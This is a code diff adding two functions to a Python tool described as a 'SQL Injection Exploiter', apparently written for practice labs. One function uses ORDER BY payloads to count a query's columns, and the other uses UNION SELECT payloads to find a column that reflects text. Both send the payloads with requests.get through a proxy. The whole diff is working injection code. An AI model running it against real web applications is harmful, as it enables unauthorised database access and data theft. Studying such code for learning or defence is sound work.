@@ -51,6 +51,29 @@ def try_login(url, method, post_data):
         else:
             return False          
 
+def exploit_sqli_column_number(url, method, post_data=None):
+    if method == 'GET':
+        for i in range(1, 50):
+            sql_payload = "'+order+by+%s--" % i
+            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
+            if r.status_code == 500:
+                if i - 1 == 0:
+                    return "one column"
+                return i - 1
+
+def exploit_sqli_string_field(url, num_col, method, post_data=None):
+    if method == 'GET':
+        for i in range(1, num_col + 1):
+            string = "'v2F6UA'"
+            payload_list = ['null'] * num_col
+            payload_list[i - 1] = string
+            sql_payload = "' union select " + ','.join(payload_list) + "--"
+            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
+            res = r.text
+            if string.strip('\'') in res:
+                return i
+        return False
+
 
 def main():
     parser = argparse.ArgumentParser(description="SQL Injection Exploiter")
